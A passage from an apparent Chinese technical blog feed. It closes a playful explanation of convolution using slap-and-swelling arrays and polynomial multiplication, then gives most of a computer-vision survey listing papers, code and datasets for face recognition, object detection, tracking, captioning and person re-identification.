<p>已知f(t)为老板在t时刻打了你f(t)巴掌。如下图，老板分别在第0秒时打了2巴掌，第1秒打了1巴掌，第2秒打了3巴掌；g(t)为打完巴掌后的t时刻肿胀的程度，下图刚打完时肿胀程度为2，等了1秒后变大为3，2秒后变成1，3秒后完全消肿。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b1.png-QNthin" title="左图是f(t)＝[2, 1, 3]，右图是g(t)=[2, 3, 1]"></p>
<p>下面三个图$h_0(t)$，$h_1(t)$，$h_2(t)$，分别是f(0),f(1),f(2)单独作用时的h(x)值，也就是分别为第0秒打了f(0)=2巴掌，第1秒打f(1)=1巴掌，第2秒打了f(2)=3巴掌的肿胀曲线。</p>
<p>计算方法为：$h_0(t) = f(0) * g(t) = 2 * [2, 3, 1] = [4, 6, 2]$</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b2.png-QNthin" title="$h0(t)$"></p>
<p>$h_1(t) = f(1) * g(t) = 1 * [2, 3, 1] $ 然后向右平移1个单位</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b3.png-QNthin" title="$h_1(t)$"></p>
<p>$h_2(t) = f(2) * g(t) = = 3 * [2, 3, 1] = [6, 9, 3]$ 然后向右平移2个单位</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b4.png-QNthin" title="$h2(t)$"></p>
<p>很明显，要求t时间的作用程度h(t)，就是把上面三个函数加起来$h(t)=h_0(t)+h_1(t)+h_2(t)$ </p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b5.png-QNthin" title="$h(t)$"></p>
<ul>
<li>说白了，卷积就是<strong>平移、叠加</strong>。（从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的<strong>加权叠加</strong>。）</li>
</ul>
<p>由上图可知，你在第三秒的时候肿胀程度为10. (记住这个结果，后面要放大招了）</p>
<h4 id="3-更有意思的来了"><a href="#3-更有意思的来了" class="headerlink" title="3. 更有意思的来了"></a>3. 更有意思的来了</h4><p>我们接下来做一个简单的初中数学题。求$(3x^2+x+2)*(x^2+3x+2)$ 中$x^3$的系数。</p>
<p><strong>普通方法</strong></p>
<p>常规做法是先把它合并同类项：</p>
<p>$(3x^2+x+2)*(x^2+3x+2)$<br>$=(3x^4+9x^3+6x^2)+(x^3+3x^2+2x)+(2x^2+6x+4)$<br>$=3x^4+10x^3+11x^2+8x+4$</p>
<p>进行完计算后，我们一眼就可以看出$x^3$的系数是10. （这种算法，我们一共进行了<strong>9次乘法运算和4次加法运算</strong>）</p>
<p><strong>文艺方法</strong></p>
<p>还是刚才那个题目，进行如下计算：</p>
<ol>
<li>我们把第一个多项式反过来，使其一个降幂排列，一个升幂排列。公式变成了$(2+x+3x^2)*(x^2+3x+2)$</li>
<li>平移：把第二个多项式每次向右平移一项</li>
<li>相乘：竖直对齐的项分别相乘</li>
<li>求和：相乘的结果相加</li>
</ol>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_b6.jpg-QNthin"></p>
<p><strong>反褶，平移，相乘，求和</strong>，这就是卷积的计算过程。（我们在求$x^3$的系数时，只需要进行<strong>1次平移运算，2次乘法，1次加法运算</strong>）</p>
<h4 id="4-结论"><a href="#4-结论" class="headerlink" title="4. 结论"></a>4. 结论</h4><p>不知道有没有人注意到，我们刚才计算的<strong>方法1</strong>其实就是前面用那一大堆图描述的方法，注意看公式X的指数就是图像的横坐标，系数为纵坐标的值。（上题x^3的系数为10，第3秒时肿胀程度也恰好为10。）</p>
<p>运用在连续函数中，只需把最后一步的求和改成求积分即可。</p>
<p>参考：</p>
<ul>
<li>[知乎]:(<a href="https://www.zhihu.com/question/22298352/)%60%E5%A6%82%E6%9E%9C%E4%BD%A0%E8%BF%98%E7%9C%8B%E4%B8%8D%E6%87%82%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E5%8E%BB%E7%9F%A5%E4%B9%8E%E6%85%A2%E6%85%A2%E7%9C%8B^_^%60">https://www.zhihu.com/question/22298352/)`如果你还看不懂，可以自己去知乎慢慢看^_^`</a></li>
<li><a href="http://blog.sciencenet.cn/home.php?mod=space&uid=287179&do=blog&id=425373">辐射、服碘、补盐、空袭和卷积—–教学难点讨论之一</a></li>
</ul>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>卷积</tag>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机视觉技术调查报告</title>
    <url>/post/cv-sjtu/</url>
    <content><![CDATA[<p><code>本资源来自网络，侵权请按ALT+F4</code></p>
<h2 id="0x01-深度学习基础框架"><a href="#0x01-深度学习基础框架" class="headerlink" title="0x01 深度学习基础框架"></a>0x01 深度学习基础框架</h2><h3 id="1-人脸检测、跟踪、识别、三维建模的开源框架、算法、论文"><a href="#1-人脸检测、跟踪、识别、三维建模的开源框架、算法、论文" class="headerlink" title="1.人脸检测、跟踪、识别、三维建模的开源框架、算法、论文"></a>1.人脸检测、跟踪、识别、三维建模的开源框架、算法、论文</h3><h4 id="1-人脸检测"><a href="#1-人脸检测" class="headerlink" title="(1) 人脸检测"></a>(1) 人脸检测</h4><p>在人脸检测方面常用的用两个，一个是 <a href="https://www.cs.cmu.edu/~peiyunh/tiny/">Tinyface</a> 能检测到比较小的人脸。可以先玩通<a href="https://github.com/peiyunh/tiny">demo</a><br>另外一篇更为常用，如果你们对固定场景，比如视频对话，检测效果不错。而且他们能标注人脸关键点。<br>文章：Joint Face Detection and Alignment using Multi-task Cascaded Convolutional Networksb(<a href="http://vis-www.cs.umass.edu/fddb/results.html">(Code)</a>) 很多最近的创业公司用这个，但是如果场景特殊需要 re-train 一下 </p>
<h4 id="2-人脸跟踪"><a href="#2-人脸跟踪" class="headerlink" title="(2) 人脸跟踪"></a>(2) 人脸跟踪</h4><p>因为这个已经不是学术前沿问题，所以 CVPR、ICCV 上没有文章研究这一块<br>人脸跟踪这一块 openCV 有一个比较好的教程 <a href="http://opencv-java-tutorials.readthedocs.io/en/latest/06-face-detection-and-tracking.html">http://opencv-java-tutorials.readthedocs.io/en/latest/06-face-detection-and-tracking.html</a><br>但是，工程上通用的做法还是，逐帧用最好的 face detector(比如 tiny face)检测后，用 optical flow 串起来。因为现在 face detection 已经很快了，没必要用 tracking 来加速，能做到很快。具体怎么弄我们可以当面讨论。<br>我的学生找了一下开源库（仅作参考，不建议用），但是不是正规的文章 <a href="https://github.com/kylemcdonald/ofxFaceTracker">https://github.com/kylemcdonald/ofxFaceTracker</a> </p>
<span id="more"></span>

<h4 id="3-人脸识别"><a href="#3-人脸识别" class="headerlink" title="(3) 人脸识别"></a>(3) 人脸识别</h4><p>主要人脸识别的文章都在 LFW 上， <a href="http://vis-www.cs.umass.edu/lfw/results.html">http://vis-www.cs.umass.edu/lfw/results.html</a> 我们主要可以看 Table 6 Mean classification accuracy û and standard error of the mean SE。<br>不过这些靠前的方法很多没有代码。目前创业公司普遍用[1]。这个我指导过别人使用，[2]的口碑也不错但不是最新的。以建议你们用[1]加大数据 train 就行了。以后，有更好开源代码出来，我再更新。 </p>
<p>[1] A Discriminative Feature Learning Approach for Deep Face Recognition[C] Yandong Wen, Kaipeng Zhang, Zhifeng Li, Yu Qia. ECCV 2016. (<a href="https://github.com/ydwen/caffe-face">(Code)</a>)<br>[2] OpenFace: A general-purpose face recognition library with mobile applications Amos, Brandon and Bartosz Ludwiczuk and Satyanarayanan, Mahadev， CMU-CS-16-118, CMU School of Computer Science，2016 (<a href="https://cmusatyalab.github.io/openface/">(Code)</a>)</p>
<h4 id="4-人脸三维建模"><a href="#4-人脸三维建模" class="headerlink" title="(4) 人脸三维建模"></a>(4) 人脸三维建模</h4><p>这一块属于比较前沿的方面，所以基本没公开数据库，也没公开代码</p>
<p>业内公认比较好的是：<br>文章：Real-time Facial Animation on Mobile Devices <a href="http://www.kunzhou.net/2013/mface-gmod.pdf">(Code)</a></p>
<p>下面这两篇是基于关键点的<br>文章：3D Shape Regression for Real-time Facial Animation <a href="http://www.kunzhou.net/2013/vface.pdf">(Code)</a></p>
<p>文章：Face Alignment Across Large Poses: A 3D Solution  <a href="https://arxiv.org/abs/1511.07212">(Code)</a><br>注：这问题属于坑比较多的，大家也不放代码用来赚钱，目前，是浙大的 Zhou Kun 有成熟的技术，需要购买的话，我可以去联系。</p>
<h3 id="2-物体探测、物体定位、视频中的物体探测、场景分类、场景分析的算法、论文"><a href="#2-物体探测、物体定位、视频中的物体探测、场景分类、场景分析的算法、论文" class="headerlink" title="2.物体探测、物体定位、视频中的物体探测、场景分类、场景分析的算法、论文"></a>2.物体探测、物体定位、视频中的物体探测、场景分类、场景分析的算法、论文</h3><h4 id="1-物体探测和物体定位"><a href="#1-物体探测和物体定位" class="headerlink" title="(1) 物体探测和物体定位"></a>(1) 物体探测和物体定位</h4><p>物体探测也称物体检测（object detection）包括物体定位（object localization）和物体识别（object recognition）两部分。一般讲是先定位物体在哪里，然后识别是什么（猫，狗，车）。但是自从 faster RCNN 后，物体定位和物体识别就同时一起做了。目前主要的开源代码是 SSD，faster RCNN, Yolo。各有优劣，SSD 和 faster RCNN 是 recall 比较高，Yolo 是 precision 比较高。 综合上来看，如果一定要选一个的话，我推荐 Yolo。注意，目前的 object detection 是用 mAP 来衡量，但 mAP 差个几个点范围内很难说明实际效果的好坏。我们组写了一个 object detection 的详细结束文件（和这份文件一起交付）。</p>
<p>另外还有一篇是刚刚出来的 Mask RCNN，性能比现在的物体检测器都好。 文章在这里 <a href="https://arxiv.org/abs/1703.06870">https://arxiv.org/abs/1703.06870</a></p>
<p>具体中文讨论在这里 <a href="https://www.zhihu.com/question/57403701">https://www.zhihu.com/question/57403701</a> 但是，没有代码，我们组也在复现中</p>
<h4 id="2-视频中的物体探测"><a href="#2-视频中的物体探测" class="headerlink" title="(2) 视频中的物体探测"></a>(2) 视频中的物体探测</h4><p>学术上这个被称为多物体跟踪（mutli-object tracking），他的基本原理是跟踪和物体检测联合训练。 主要的算法可以在这里两个网站上查到：<br>这个是专门做多物体跟踪的： <a href="https://motchallenge.net/">https://motchallenge.net/</a><br>里面有一些有文章<br>另一个网站是： <a href="http://www.cvlibs.net/datasets/kitti/eval_tracking.php">http://www.cvlibs.net/datasets/kitti/eval_tracking.php</a><br>这个虽然是无人车的，但原理差不多，你们可以用他们的模型</p>
<p>如果代码的话推荐这篇，是我朋友的工作， <a href="http://yuxng.github.io/">http://yuxng.github.io/</a><br>这两篇文章都有代码，<br>Learning to Track: Online Multi-Object Tracking by Decision Making.<br>Subcategory-aware Convolutional Neural Networks for Object Proposals and Detection.（这篇没有 model，需要的话，我可以发给你们做研究用，但是如果要商用请和作者联系。） </p>
<p>另外 multi-object tracking 都比较慢，如果要快点的话，可以使用 yolo 每帧做处理，然后简单复现这篇文章，就行了。<br>Seq-NMS for Video Object Detection <a href="https://arxiv.org/abs/1602.08465">https://arxiv.org/abs/1602.08465</a></p>
<h4 id="3-场景分类、场景分析"><a href="#3-场景分类、场景分析" class="headerlink" title="(3) 场景分类、场景分析"></a>(3) 场景分类、场景分析</h4><p>场景分类本质上一个图像分类问题，你们只要对图像的场景打上多类标签，进入分类器训练就行了，目前最好的分类器，在 ResNet 之后有两个更好 ResNext，kaiming he 之后的作品。 </p>
<p>• <a href="https://arxiv.org/abs/1611.05431">Aggregated Residual Transformations for Deep Neural Networks</a>, <a href="https://github.com/facebookresearch/ResNeXt">(Code)</a><br>• <a href="https://arxiv.org/abs/1602.07261">Inception-v4, Inception-ResNet and the Impact of Residual Connections on Learning</a> <a href="https://github.com/tensorflow/models/blob/master/slim/nets/ince9ption_resnet_v2.py">(Code)</a></p>
<p>主流的场景分类数据库是 <a href="http://places.csail.mit.edu/">MIT scene dataset</a>你们可以好好用来做 pre-train<br>这里有一个 demo，比较 cool，你们可以直接用 <a href="http://places.csail.mit.edu/demo.html">http://places.csail.mit.edu/demo.html</a></p>
<h3 id="3-图片场景描述的算法、论文"><a href="#3-图片场景描述的算法、论文" class="headerlink" title="3.图片场景描述的算法、论文"></a>3.图片场景描述的算法、论文</h3><p>这个在学术上叫 image-captioning 对于这个问题 coco 有一个排名，你们可以在这个排名上找到比较靠前的文章和代码，但是衡量好坏的 metric 比较受诟病。也就是分数高的不一定效果好，所以这个还是你要自己感受一下。 <a href="http://mscoco.org/dataset/#captions-leaderboard">http://mscoco.org/dataset/#captions-leaderboard</a> </p>
<p>我先简单列出几个有代表性的，且有代码的</p>
<p>• 论文：Oriol Vinyals, Alexander Toshev, Samy Bengio, Dumitru Erhan, Show and Tell: A Neural Image Caption Generator, arXiv:1411.4555. <a href="https://github.com/tensorflow/models/tree/master/im2txt">(Code)</a><br>• 论文：Andrej Karpathy, Li Fei-Fei, Deep Visual-Semantic Alignments for Generating Image Description, CVPR, 2015. <a href="https://github.com/karpathy/neuraltalk">(Code)</a><br>• 论文：Kelvin Xu, Jimmy Lei Ba, Ryan Kiros, Kyunghyun Cho, Aaron Courville, Ruslan Salakhutdinov, Richard S. Zemel, Yoshua Bengio, Show, Attend, and Tell: Neural Image Caption Generation with Visual Attention, arXiv:1502.03044 / ICML 2015 <a href="https://github.com/kelvinxu/arctic-captions">(Code)</a><br>• 论文：Ryan Kiros, Ruslan Salakhutdinov, Richard S. Zemel, Unifying Visual-Semantic Embeddings with Multimodal Neural Language Models, arXiv:1411.2539. <a href="https://github.com/ryankiros/visual-semantic-embedding">(Code)</a><br>• Jeff Donahue, Lisa Anne Hendricks, Sergio Guadarrama, Marcus Rohrbach, Subhashini Venugopalan, Kate Saenko, Trevor Darrell, Long-term Recurrent Convolutional Networks for Visual Recognition and Description, arXiv:1411.4389<a href="https://github.com/garythung/torch-lrcn">(Code)</a><br>• 论文：Jacob Devlin, Saurabh Gupta, Ross Girshick, Margaret Mitchell, C. Lawrence Zitnick, Exploring Nearest Neighbor Approaches for Image Captioning, arXiv:1505.04467 代码：虽然没代码但是实现起来比较简单 </p>
<h3 id="4-视频场景描述的算法、论文"><a href="#4-视频场景描述的算法、论文" class="headerlink" title="4.视频场景描述的算法、论文"></a>4.视频场景描述的算法、论文</h3><p>我推荐几篇有代码的文章 </p>
<p>• Subhashini Venugopalan, Marcus Rohrbach, Jeff Donahue, Raymond Mooney, Trevor Darrell, Kate Saenko, Sequence to Sequence–Video to Text, arXiv:1505.00487. <a href="https://gist.github.com/vsubhashini/38d087e140854fee4b14">(Code)</a><br>• Subhashini Venugopalan, Huijuan Xu, Jeff Donahue, Marcus Rohrbach, Raymond Mooney, Kate Saenko, Translating Videos to Natural Language Using Deep Recurrent Neural Networks, arXiv:1412.4729. <a href="https://gist.github.com/vsubhashini/3761b9ad43f60db9ac3d">(Code)</a><br>• Li Yao, Atousa Torabi, Kyunghyun Cho, Nicolas Ballas, Christopher Pal, Hugo Larochelle, Aaron Courville, Describing Videos by Exploiting Temporal Structure, arXiv:1502.08029 <a href="https://github.com/yaoli/arctic-capgen-vid">(Code)</a></p>
<h3 id="5-人脸、物体、场景等算法的训练集大小、训练周期及能达到的效果，一些调参、训练技巧等"><a href="#5-人脸、物体、场景等算法的训练集大小、训练周期及能达到的效果，一些调参、训练技巧等" class="headerlink" title="5.人脸、物体、场景等算法的训练集大小、训练周期及能达到的效果，一些调参、训练技巧等"></a>5.人脸、物体、场景等算法的训练集大小、训练周期及能达到的效果，一些调参、训练技巧等</h3><p>• <strong>人脸数据库</strong> LFW，<a href="http://vis-www.cs.umass.edu/lfw/">http://vis-www.cs.umass.edu/lfw/</a> 6千对人脸图片，用于验证（判断是否为某个人）<br>• <strong>FDDB</strong>，<a href="http://vis-www.cs.umass.edu/fddb/">http://vis-www.cs.umass.edu/fddb/</a> 2800 张用于检测，测试<br>• <strong>CELEBA</strong> <a href="http://mmlab.ie.cuhk.edu.hk/projects/CelebA.html">http://mmlab.ie.cuhk.edu.hk/projects/CelebA.html</a> 20 万多张，用于配准，检测，属性分析，<br>• <strong>AFLW</strong> <a href="https://lrs.icg.tugraz.at/research/aflw/">https://lrs.icg.tugraz.at/research/aflw/</a> 2 万 3 千多图片，有检测，经常用于训练。<br>• <strong>megaface</strong> <a href="http://megaface.cs.washington.edu/">http://megaface.cs.washington.edu/</a> 100 万张图片，人脸识别和验证都有（现阶段比较热门的数据集）<br>• <strong>中科院数据库</strong> <a href="http://www.cbsr.ia.ac.cn/english/CASIA-WebFace-Database.html">http://www.cbsr.ia.ac.cn/english/CASIA-WebFace-Database.html</a> 50 万人脸验证数据，1 万多个人<br>• <strong>物体检测数据库</strong> 如果你们做小规模验证可以使用 VOC dataset <a href="http://host.robots.ox.ac.uk/pascal/VOC/">http://host.robots.ox.ac.uk/pascal/VOC/</a> 大概是万级别的数量<br>• 如果大规模话有两个数据集 <strong>Imagenet</strong> <a href="http://image-net.org/">http://image-net.org/</a> 和 <strong>COCO</strong> <a href="http://mscoco.org/">http://mscoco.org/</a> 这两个都百万级别的<br>• 调参技巧这个很难说，要看具体情况，很难说给出一个普遍的定论。主要是 learning rate 吧，开始的时候比较大，后面比较稳定的时候慢慢减小。 </p>
<h3 id="6-自然场景中的文字检测的算法"><a href="#6-自然场景中的文字检测的算法" class="headerlink" title="6 自然场景中的文字检测的算法"></a>6 自然场景中的文字检测的算法</h3><p>这个问题的话，大量的算法和论文库在这里： <a href="https://github.com/chongyangtao/Awesome-Scene-Text-Recognition">https://github.com/chongyangtao/Awesome-Scene-Text-Recognition</a><br>把这些文章和代码看完就差不多了。这一块做得最好的华中科技大学的 xiang bai。需要购买技术的话，我可以联系。</p>
<p>如果代码推荐的话，可以试一下<br><a href="https://github.com/baidu-research/warp-ctc">https://github.com/baidu-research/warp-ctc</a><br><a href="https://github.com/bgshih/crnn">https://github.com/bgshih/crnn</a> </p>
<p>可以是这样两篇文章看看：<br>Connectionist Temporal Classification: Labelling Unsegmented Sequence Data with Recurrent Neural Networks.<br>An End-to-End Trainable Neural Network for Image-based Sequence Recognition and Its Application to Scene Text Recognition. </p>
<h3 id="7-自然场景中人物（且有遮挡，如人脸被遮挡）较多的情况下实时检测及再识别。"><a href="#7-自然场景中人物（且有遮挡，如人脸被遮挡）较多的情况下实时检测及再识别。" class="headerlink" title="7 自然场景中人物（且有遮挡，如人脸被遮挡）较多的情况下实时检测及再识别。"></a>7 自然场景中人物（且有遮挡，如人脸被遮挡）较多的情况下实时检测及再识别。</h3><p>这个学术界有一个专门的 topic，叫做 Person Re-identification。这一块是中山大学的 weishi zhen 做得最好，需要购买技术，我可以办你们联系。我做了一个调研如下（推荐第一个）， </p>
<p>[1] <a href="https://arxiv.org/abs/1604.07528">Xiao T, Li H, Ouyang W, et al. Learning deep feature representations with domain guided dropout for person re-identification[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016: 1249-1258.</a>, <a href="https://github.com/Cysu/dgd_person_reid">(Code)</a></p>
<p>[2] Yang Yang, LongyinWen, Siwei Lyu, Stan Z. Li,Unsupervised Learning of Multi-Level Descriptors for Person Re-Identification, Association for the Advancement of Artificial Intelligence (AAAI), San Francisco, California, USA, 2017<br>(Code): need email to author </p>
<p>[3] <a href="http://t.cn/R6imzBZ">Matsukawa T, Okabe T, Suzuki E, et al. Hierarchical gaussian descriptor for person re-identification[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016: 1363-1372.</a>, <a href="http://www.i.kyushu-u.ac.jp/~matsukawa/ReID_files/ReID_GOG_v1.01.zip">(Code)</a></p>
<p>[4] <a href="http://isee.sysu.edu.cn/files/resource/Top-push_Video-based_Person_Re-identification.pdf">You J, Wu A, Li X, et al. Top-push video-based person re-identification[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016: 1345-1353. </a>, <a href="http://isee.sysu.edu.cn/files/resource/TDL.zip">(Code)</a></p>
<p>[5] <a href="https://arxiv.org/pdf/1611.05666.pdf">Zheng Z, Zheng L, Yang Y. A Discriminatively Learned CNN Embedding for Person Re-identification[J]. arXiv preprint arXiv:1611.05666, 2016.</a>, <a href="https://github.com/layumi/2016_person_re-ID">(Code)</a></p>
<p>[6] <a href="http://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Ahmed_An_Improved_Deep_2015_CVPR_paper.pdf">Ahmed E, Jones M, Marks T K. An improved deep learning architecture for person re-identification[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2015: 3908-3916.</a>, <a href="https://github.com/Deep-Learning-Person-Re-Identification/Implementaion-1">(Code)</a></p>
<p>[7] <a href="http://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Liao_Person_Re-Identification_by_2015_CVPR_paper.pdf">Liao S, Hu Y, Zhu X, et al. Person re-identification by local maximal occurrence representation and metric learning[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2015: 2197-2206.</a>, <a href="http://www.openpr.org.cn/index.php/(Code)-For-Image-ProcessingAnd-Computer-Vision/102-LOMO-Feature-Extraction-and-XQDA-Metric-Learning-for-Person-Re-identification/View-details.html">(Code)</a></p>
<p>[8] <a href="http://t.cn/R6i1zBW">Zheng L, Wang S, Tian L, et al. Query-adaptive late fusion for image search and person re-identification[C]//Proceedings of the IEEE conference on computer vision and pattern recognition. 2015: 1741-1750.</a> (<a href="https://drive.google.com/open?id=0B6tjyrV1YrHedWZ2UGlWVHFiQUE">(Code) google drive</a>, <a href="http://pan.baidu.com/s/1nt3hvex">(Code) baidu pan</a>)</p>
<p>[9] <a href="http://t.cn/R6irPZf">Yang Y, Yang J, Yan J, et al. Salient color names for person re-identification[C]//European Conference on Computer Vision. Springer International Publishing, 2014: 536-551.</a>, (Code): need email to author </p>
<p>[10] <a href="http://t.cn/R6iBIQm">Bazzani L, Cristani M, Murino V. Symmetry-driven accumulation of local features for human characterization and re-identification[J]. Computer Vision and Image Understanding, 2013, 117(2): 130-144.</a>, <a href="https://github.com/lorisbaz/SDALF">(Code)</a></p>
<p>[11] <a href="http://robustsystems.coe.neu.edu/sites/robustsystems.coe.neu.edu/files/systems/papers/FeiXiong_ECCV14.pdf">Xiong F, Gou M, Camps O, et al. Person re-identification using kernel-based metric learning methods[C]//European conference on computer vision. Springer International Publishing, 2014: 1-16.</a>, <a href="https://github.com/NEU-Gou/kernel-metric-learning-reid">(Code)</a></p>
<p>[12] <a href="http://www.ee.cuhk.edu.hk/~rzhao/project/salience_cvpr13/zhaoOWcvpr13.pdf">Zhao R, Ouyang W, Wang X. Unsupervised salience learning for person re-identification[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2013: 3586-3593.</a>, <a href="https://github.com/Robert0812/salience_reid">(Code)</a></p>
<p>[13] <a href="http://t.cn/R6iRdLN">Farenzena M, Bazzani L, Perina A, et al. Person re-identification by symmetry-driven accumulation of local features[C]//Computer Vision and Pattern Recognition (CVPR), 2010 IEEE Conference on. IEEE, 2010: 2360-2367. </a>, <a href="https://github.com/lorisbaz/SDALF">(Code)</a></p>
<h2 id="0x02-相关问题"><a href="#0x02-相关问题" class="headerlink" title="0x02 相关问题"></a>0x02 相关问题</h2><p>1、低分辨率下的视频人脸识别（32*32 以下）<br>答： 这种一般没办法弄，你们可以尝试的做去 block，或者去噪预处理，会有一点点提升。  </p>
<p>2、视屏中，带遮挡（遮挡会移动）的人脸识别<br>答： 如果遮挡不大的话，深度学习对这方面是有一定鲁棒性的  </p>
<p>3、现有的人脸检测准确率不高的情况下，是否有办法通过结合深度学习和传统人脸检测方法来达到快速的高效方法<br>答：如果，你们人脸区间固定（比如人脸登录），可以先提取深度学习特征，然后做 add-boosting.做检测框。 Fast-RCNN 差不多能用。 To Boost or Not to Boost? On the Limits of Boosted Trees for Object Detection </p>
<p>4、在训练数据不全面的情况（如不存在带眼镜的情况下），如果被识别人带了眼镜等饰物，如何不受干扰。（对于眼镜的情况，除了在数据增广中寻找眼睛加上遮挡，还有其他办法吗）<br>答：这个使用办法解决的，一般用深度学习产生去眼镜照片，再识别。 Robust Deep Auto-encoder for Occluded Face Recognition </p>
<h2 id="0x03-学术前沿"><a href="#0x03-学术前沿" class="headerlink" title="0x03 学术前沿"></a>0x03 学术前沿</h2><h3 id="1-当前图像、视频领域的学术前沿研究方向、算法框架及相关论文"><a href="#1-当前图像、视频领域的学术前沿研究方向、算法框架及相关论文" class="headerlink" title="1.当前图像、视频领域的学术前沿研究方向、算法框架及相关论文"></a>1.当前图像、视频领域的学术前沿研究方向、算法框架及相关论文</h3><p>目前，比较前沿的大概有几个方向： </p>
<h4 id="1-生成对抗模型："><a href="#1-生成对抗模型：" class="headerlink" title="(1) 生成对抗模型："></a>(1) 生成对抗模型：</h4><p>• Ian J. Goodfellow, Jean Pouget-Abadie, Mehdi Mirza, Bing Xu, David Warde-Farley, Sherjil Ozair, Aaron Courville, Yoshua Bengio, Generative Adversarial Networks, NIPS, 2014. （最早的一篇）<br>• Mehdi Mirza, Simon Osindero， Conditional Generative Adversarial Nets，arXiv:1411.1784 [cs.LG] （比较出名的一篇） </p>
<p>这些都是近期作品</p>
<p>• Jost Tobias Springenberg, “Unsupervised and Semi-supervised Learning with Categorical Generative Adversarial Networks”, ICLR 2016<br>• Harrison Edwards, Amos Storkey, “Censoring Representations with an Adversary”, ICLR 2016,<br>• Jun-Yan Zhu, Philipp Krahenbuhl, Eli Shechtman, and Alexei A. Efros, “Generative Visual Manipulation on the Natural Image Manifold”, ECCV 2016.<br>• Mixing Convolutional and Adversarial Networks ◦Alec Radford, Luke Metz, Soumith Chintala, “Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks”, ICLR 2016.   </p>
<h4 id="2-深度增强学习"><a href="#2-深度增强学习" class="headerlink" title="(2) 深度增强学习"></a>(2) 深度增强学习</h4><p>• <a href="http://www0.cs.ucl.ac.uk/staff/d.silver/web/Teaching.html">Reinforcement Learning Course by David Silver</a><br>• <a href="https://webdocs.cs.ualberta.ca/~sutton/book/bookdraft2016sep.pdf">Reinforcement Learning: An Introduction by Richard S. Sutton and Andrew G. Barto</a><br>• Highly related with Silver’s course, you can read/skip the corresponding chapters while taking the courses </p>
<p>一些开始的论文 f Deep Reinforcement Learning (DQN)<br>• Mnih, V., Kavukcuoglu, K., Silver, D., Graves, A., Antonoglou, I., Wierstra, D., &amp; Riedmiller, M. (2013, December 20). Playing Atari with Deep Reinforcement Learning. arXiv.org. SJTU Machine Vision and Intelligence Group page 7<br>• Mnih, V., Kavukcuoglu, K., Silver, D., Rusu, A. A., Veness, J., Bellemare, M. G., et al. (2015). Human-level control through deep reinforcement learning. Nature, 518(7540), 529–533. </p>
<p>一些最近的论文<br>• Wang, Z., de Freitas, N., &amp; Lanctot, M. (2015). Dueling Network Architectures for Deep Reinforcement Learning. CoRR.<br>• van Hasselt, H., Guez, A., &amp; Silver, D. (2016). Deep Reinforcement Learning with Double Q-Learning. AAAI.<br>• Hausknecht, M. J., &amp; Stone, P. (2015). Deep Recurrent Q-Learning for Partially Observable MDPs. AAAI.<br>• Bellemare, M. G., Ostrovski, G., Guez, A., Thomas, P. S., &amp; Munos, R. (2015). Increasing the Action Gap - New Operators for Reinforcement Learning. CoRR, cs.AI.<br>• Osband, I., Blundell, C., Pritzel, A., &amp; Van Roy, B. (2016, February 15). Deep Exploration via Bootstrapped DQN. arXiv.org.<br>• Schaul, T., Quan, J., Antonoglou, I., &amp; Silver, D. (2015). Prioritized Experience Replay. CoRR.<br>• Mnih, V., Badia, A. P., Mirza, M., Graves, A., Lillicrap, T. P., Harley, T., et al. (2016, February 5). Asynchronous Methods for Deep Reinforcement Learning. arXiv.org. </p>
<p>一些应用有关的论文<br>• Silver, D., Huang, A., Maddison, C. J., Guez, A., Sifre, L., van den Driessche, G., et al. (2016). Mastering the game of Go with deep neural networks and tree search. Nature, 529(7587), 484–489.<br>• Mnih, V., Heess, N., &amp; Graves, A. (2014). Recurrent models of visual attention. In Advances in Neural Information Processing Systems (pp. 2204-2212). SJTU Machine Vision and Intelligence Group page 8<br>• Zhu, Y., Mottaghi, R., Kolve, E., Lim, J. J., Gupta, A., Fei-Fei, L., &amp; Farhadi, A. (2016, September 17). Target-driven Visual Navigation in Indoor Scenes using Deep Reinforcement Learning. arXiv.org. </p>
<h4 id="3-人体姿态估计"><a href="#3-人体姿态估计" class="headerlink" title="(3) 人体姿态估计"></a>(3) 人体姿态估计</h4><p>代表文章有两篇：<br>• Haoshu Fang, Shuqin Xie, Cewu Lu， RMPE: Regional Multi-person Pose Estimation， arXiv:1612.00137 [cs.CV]<br>• Zhe Cao, Tomas Simon, Shih-En Wei, Yaser Sheikh， Realtime Multi-person 2D Pose Estimation using Part Affinity Fields， CVPR 2017 </p>
<h4 id="4-视觉问答"><a href="#4-视觉问答" class="headerlink" title="(4) 视觉问答"></a>(4) 视觉问答</h4><p>这方面的一些文章</p>
<p>• Xiong, Caiming, Stephen Merity, and Richard Socher. “Dynamic Memory Networks for Visual and Textual Question Answering.” arXiv:1603.01417 (2016).<br>• Mateusz Malinowski, Marcus Rohrbach, Mario Fritz, Ask Your Neurons: A Neural-based Approach to Answering Questions about Images, arXiv:1505.01121.<br>• Stanislaw Antol, Aishwarya Agrawal, Jiasen Lu, Margaret Mitchell, Dhruv Batra, C. Lawrence Zitnick, Devi Parikh, VQA: Visual Question Answering, CVPR, 2015 SUNw:Scene Understanding workshop.<br>• Hauyuan Gao, Junhua Mao, Jie Zhou, Zhiheng Huang, Lei Wang, Wei Xu, Are You Talking to a Machine? Dataset and Methods for Multilingual Image Question Answering, arXiv:1505.05612.<br>• Hyeonwoo Noh, Paul Hongsuck Seo, and Bohyung Han, Image Question Answering using Convolutional Neural Network with Dynamic Parameter Prediction, arXiv:1511.05765<br>• Yang, Z., He, X., Gao, J., Deng, L., &amp; Smola, A. (2015). Stacked 